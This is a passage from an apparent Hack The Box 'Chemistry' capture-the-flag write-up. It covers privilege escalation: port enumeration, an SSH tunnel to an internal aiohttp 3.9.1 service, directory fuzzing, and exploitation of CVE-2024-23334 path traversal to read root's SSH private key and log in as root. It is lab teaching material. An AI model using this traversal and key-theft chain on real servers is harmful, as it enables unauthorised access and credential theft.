9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Oct 21 13:34:58 2024 from 10.10.14.91
rosa@chemistry:~$ cat user.txt 
326c3eeb619433b907805ce304f3be7e
```

# Privilege Escalation

If we look at its local ports we can see a curious one:

```bash
rosa@chemistry:~$ ss -tln
State                 Recv-Q                Send-Q                               Local Address:Port                               Peer Address:Port                Process                
LISTEN                0                     4096                                 127.0.0.53%lo:53                                      0.0.0.0:*                                          
LISTEN                0                     128                                        0.0.0.0:22                                      0.0.0.0:*                                          
LISTEN                0                     128                                        0.0.0.0:5000                                    0.0.0.0:*                                          
LISTEN                0                     128                                      127.0.0.1:8080                                    0.0.0.0:*                                          
LISTEN                0                     128                                           [::]:22                                         [::]:*                                          
```

We will be able to see that it has in the `127.0.0.1` the port `8080` we will take it to our local machine with SSH:

```bash
❯ ssh -L 127.0.0.1:8082:127.0.0.1:8080 rosa@10.10.11.38
rosa@10.10.11.38's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 21 Oct 2024 01:54:10 PM UTC

  System load:           0.02
  Usage of /:            84.2% of 5.08GB
  Memory usage:          33%
  Swap usage:            0%
  Processes:             256
  Users logged in:       2
  IPv4 address for eth0: 10.10.11.38
  IPv6 address for eth0: dead:beef::250:56ff:feb0:f8d1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Oct 21 13:50:13 2024 from 10.10.16.37
rosa@chemistry:~$ 
```

Now if we go to our browser and put `127.0.0.1:8082` we will be able to see the service that is running in the `8080` in the machine:

![](/assets/images/hackthebox/chemistry/4.png)

What we are going to do first is to see what kind of service you are providing to that website:

```bash
❯ nmap -p8082 -sCV 127.0.0.1 -n -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 15:57 CEST
Nmap scan report for 127.0.0.1
Host is up (0.000059s latency).

PORT     STATE SERVICE VERSION
8082/tcp open  http    aiohttp 3.9.1 (Python 3.9)
|_http-title: Site Monitoring
|_http-server-header: Python/3.9 aiohttp/3.9.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.15 seconds
```

We will be able to see that it has `aiohttp/3.9.1` if we look for that version we will be able to find the following:

- [https://nvd.nist.gov/vuln/detail/CVE-2024-23334](https://nvd.nist.gov/vuln/detail/CVE-2024-23334)

Let's exploit it manually! ;)

First of all we will do some fuzzing to see if we find more interesting things:

```bash
❯ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://127.0.0.1:8082'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1:8082
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 403) [Size: 14]
```

We find the `assets` folder, seeing some PoC's I have noticed that it happens in some folder of the web as for example `static` or `assets` so we are going to try, if we try from the web we will not be able to give us a `403 Forbidden` what we will do is with BurpSuite we will intercept the load of the web in the `assets` folder:

![](/assets/images/hackthebox/chemistry/5.png)

We will try to make the Path Traversal from the `assets` folder:

![](/assets/images/hackthebox/chemistry/6.png)

Now we will try to see the `id_rsa` of the root user:

![](/assets/images/hackthebox/chemistry/7.png)

```bash
❯ nano id_rsa
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.10.11.38
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 21 Oct 2024 02:07:59 PM UTC

  System load:           0.08
  Usage of /:            84.9% of 5.08GB
  Memory usage:          35%
  Swap usage:            0%
  Processes:             271
  Users logged in:       2
  IPv4 address for eth0: 10.10.11.38
  IPv6 address for eth0: dead:beef::250:56ff:feb0:f8d1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

9 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Oct 21 12:15:00 2024 from 10.10.14.73
root@chemistry:~# whoami
root
root@chemistry:~#
```

root! :)

![](/assets/images/hackthebox/chemistry/2DV.gif)